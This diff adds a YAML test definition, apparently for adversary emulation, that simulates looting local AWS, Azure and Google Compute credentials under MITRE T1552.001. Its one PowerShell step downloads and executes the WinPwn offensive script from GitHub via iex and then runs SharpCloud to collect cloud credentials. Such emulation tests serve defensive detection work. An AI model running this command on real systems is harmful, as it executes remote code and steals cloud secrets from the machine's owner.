@@ -1,0 +1,21 @@
+api_version: "2.0"
+name: WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials
+description: Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn
+uuid: aaa87b0e-5232-4649-ae5c-f1724a4b2798
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1552: Unsecured Credentials'
+    subtechniques:
+        - 'T1552.001: Credentials In Files'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---loot-local-credentials---aws,-microsoft-azure,-and-google-compute-credentials
+      inline: "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSharpCloud -consoleoutput -noninteractive  "
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
